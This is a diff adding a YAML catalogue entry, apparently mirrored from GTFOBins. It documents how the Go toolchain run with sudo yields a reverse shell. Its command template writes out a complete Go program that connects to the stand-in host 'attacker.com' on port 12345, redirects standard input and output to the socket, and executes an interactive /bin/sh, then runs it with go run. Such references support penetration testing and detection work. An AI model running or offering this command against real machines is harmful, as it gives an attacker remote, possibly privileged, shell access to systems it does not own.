@@ -1,0 +1,31 @@
+id: gtfobins/go/reverse-shell/sudo
+type: binary
+platform: linux
+name: go
+phases:
+- execution
+- command-and-control
+- privilege-escalation
+capabilities:
+- reverse-shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo -e ''package main\nimport (\n\t"os"\n\t"net"\n\t"syscall"\n)\n\nfunc main(){\n\tfd,
+    _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\tip := net.ParseIP("attacker.com").To4()\n\taddr
+    := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], ip)\n\tsyscall.Connect(fd, addr)\n\tsyscall.Dup2(fd,
+    0)\n\tsyscall.Dup2(fd, 1)\n\tsyscall.Dup2(fd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"},
+    os.Environ())\n}'' >/path/to/temp-file.go
+
+    go run /path/to/temp-file.go'
+references:
+- https://gtfobins.github.io/gtfobins/go/
+tags:
+- linux
+- unix
+- gtfobins
